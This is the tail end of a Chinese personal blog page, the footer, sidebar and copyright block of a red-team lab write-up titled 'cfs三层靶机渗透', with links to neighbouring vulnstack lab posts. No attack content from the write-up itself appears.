+<h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p><a href="https://mp.weixin.qq.com/s?__biz=MzI4MTkzNDIyMg==&amp;mid=2247488522&amp;idx=1&amp;sn=372d9a0ecf3926f84e9f4bc24c6040fd&amp;source=41#wechat_redirect" target="_blank" rel="noopener">https://mp.weixin.qq.com/s?__biz=MzI4MTkzNDIyMg==&amp;mid=2247488522&amp;idx=1&amp;sn=372d9a0ecf3926f84e9f4bc24c6040fd&amp;source=41#wechat_redirect</a></p>
+
+    </div>
+
+    
+    
+    
+
+    <div>
+      
+        <div>
+    
+        <div style="text-align:center;color: #ccc;font-size:14px;">-------------本文结束<i class="fa fa-paw"></i>感谢您的阅读-------------</div>
+    
+</div>
+
+      
+    </div>
+        
+      
+        
+
+<div>
+<ul class="post-copyright">
+  <li class="post-copyright-author">
+    <strong>本文作者： </strong>C0cho
+  </li>
+  <li class="post-copyright-link">
+    <strong>本文链接：</strong>
+    <a href="https://choge.top/2021/02/20/cfs三层靶机渗透/" title="cfs三层靶机渗透">https://choge.top/2021/02/20/cfs三层靶机渗透/</a>
+  </li>
+  <li class="post-copyright-license">
+    <strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" rel="noopener" target="_blank"><i class="fa fa-fw fa-creative-commons"></i>BY-NC-SA</a> 许可协议。转载请注明出处！
+  </li>
+</ul>
+</div>
+
+      
+
+      <footer class="post-footer">
+          
+            
+          
+          <div class="post-tags">
+            
+              <a href="/tags/red-team/" rel="tag"># red team</a>
+            
+          </div>
+        
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-next post-nav-item">
+              
+                <a href="/2021/02/19/vulnstack1靶机实战/" rel="next" title="vulnstack1靶机实战">
+                  <i class="fa fa-chevron-left"></i> vulnstack1靶机实战
+                </a>
+              
+            </div>
+
+            <span class="post-nav-divider"></span>
+
+            <div class="post-nav-prev post-nav-item">
+              
+                <a href="/2021/02/22/vulnstack3靶机渗透/" rel="prev" title="vulnstack3靶机渗透">
+                  vulnstack3靶机渗透 <i class="fa fa-chevron-right"></i>
+                </a>
+              
+            </div>
+          </div>
+        
+      </footer>
+    
+  </article>
+  
+  
+  
+
+  </div>
+
+
+          </div>
+          
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+        
+        
+        
+        
+      
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#环境配置"><span class="nav-number">1.</span> <span class="nav-text">环境配置</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#外网打点"><span class="nav-number">2.</span> <span class="nav-text">外网打点</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#内网渗透"><span class="nav-number">3.</span> <span class="nav-text">内网渗透</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#参考"><span class="nav-number">4.</span> <span class="nav-text">参考</span></a></li></ol></div>
+        
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image"
+      src="/images/author.jpg"
+      alt="C0cho">
+  <p class="site-author-name" itemprop="name">C0cho</p>
+  <div class="site-description" itemprop="description">记录生活的点点滴滴</div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+        
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">76</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+    
+      
+      
+      <div class="site-state-item site-state-categories">
+        
+          
+            <a href="/categories/">
+          
+        
+        <span class="site-state-item-count">8</span>
+        <span class="site-state-item-name">分类</span>
+        </a>
+      </div>
+    
+      
+      
+      <div class="site-state-item site-state-tags">
+        
+          
+            <a href="/tags/">
+          
+        
+        <span class="site-state-item-count">44</span>
+        <span class="site-state-item-name">标签</span>
+        </a>
+      </div>
+    
+  </nav>
+</div>
+  <div class="feed-link motion-element">
+    <a href="/atom.xml" rel="alternate">
+      <i class="fa fa-rss"></i>RSS
+    </a>
+  </div>
+  <div class="links-of-author motion-element">
+      <span class="links-of-author-item">
+      
+      
+        
+      
+      
+        
+      
+        <a href="https://github.com/yourname" title="GitHub &rarr; https://github.com/yourname" rel="noopener" target="_blank"><i class="fa fa-fw fa-github"></i>GitHub</a>
+      </span>
+    
+      <span class="links-of-author-item">
+      
+      
+        
+      
+      
+        
+      
+        <a href="mailto:yourname@gmail.com" title="E-Mail &rarr; mailto:yourname@gmail.com" rel="noopener" target="_blank"><i class="fa fa-fw fa-envelope"></i>E-Mail</a>
+      </span>
+    
+  </div>
+  <div class="cc-license motion-element" itemprop="license">
+    
+  
+    <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" class="cc-opacity" rel="noopener" target="_blank"><img src="/images/cc-by-nc-sa.svg" alt="Creative Commons"></a>
+  </div>
+
+
+
+      </div>
+        <div class="back-to-top motion-element">
+          <i class="fa fa-arrow-up"></i>
+          <span>0%</span>
+        </div>
+      
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        
+
+<div class="copyright">
+  &copy; 2019 – 
+  <span itemprop="copyrightYear">2021</span>
+  <span class="with-love" id="animate">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">C0cho</span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-area-chart"></i>
+    </span>
+      <span class="post-meta-item-text">站点总字数：</span>
+    
+    <span title="站点总字数">262k</span>
+</div>
+
+
+
+        
+<div class="busuanzi-count">
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-user"></i>
+      </span>
+      <span class="site-uv" title="总访客量">
+        <span id="busuanzi_value_site_uv"></span>
+      </span>
+    </span>
+  
+    <span class="post-meta-divider">|</span>
+  
+    <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-eye"></i>
+      </span>
+      <span class="site-pv" title="总访问量">
+        <span id="busuanzi_value_site_pv"></span>
+      </span>
+    </span>
+  
+</div>
+
+
+
+
+
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js?v=3.1.0"></script>
+  <script src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  <script src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+<script src="/js/utils.js?v=7.4.1"></script><script src="/js/motion.js?v=7.4.1"></script>
+<script src="/js/schemes/pisces.js?v=7.4.1"></script>
+
+<script src="/js/next-boot.js?v=7.4.1"></script>
+
+
+
+  
+
+
+
+
+
+
+
+
+  <script src="/js/local-search.js?v=7.4.1"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+  
+
+</body>
+</html>
